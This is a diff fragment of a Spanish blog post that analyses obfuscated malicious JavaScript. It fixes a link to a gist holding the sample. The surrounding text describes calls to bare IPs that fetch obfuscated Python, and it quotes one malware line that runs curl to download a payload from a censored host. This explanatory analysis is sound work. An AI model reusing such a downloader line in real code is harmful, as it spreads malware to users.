@@ -37,7 +37,7 @@ Nuestro amigo era como Jorge, curioso, así que embelleció el código y encontr
 - [Llamadas a una API]({{< ref path="/posts/software-architecture/caracteristicas-basicas-de-una-api-rest/index.md" lang="es" >}}) directo a una dirección IP, sin dominio, algunos sin respuesta y otros que descargan scripts ofuscados en Python (supongo que le da un seguimiento al proceso de hackeo instalando un backdoor o algún RAT).
 
 
-Si quieres ~~infectarte~~ leer el código visita [el repositorio de github](https://gist.github.com/jbrit/9a6525d086411a0fcffea202f368e780#file-initial-obfuscated-iife-js#?), no me hago responsable de nada.
+Si quieres ~~infectarte~~ leer el código visita [el repositorio de github](https://gist.github.com/jbrit/9a6525d086411a0fcffea202f368e780#file-initial-obfuscated-iife-js), no me hago responsable de nada.
 
 ``` javascript
 _0x42b722("curl -Lo \"" + _0x157519 + "\" \"" + "http://<censored>/pdown" + "\"", (_0x204dd7, _0x6e1c16, _0x52b515) => {
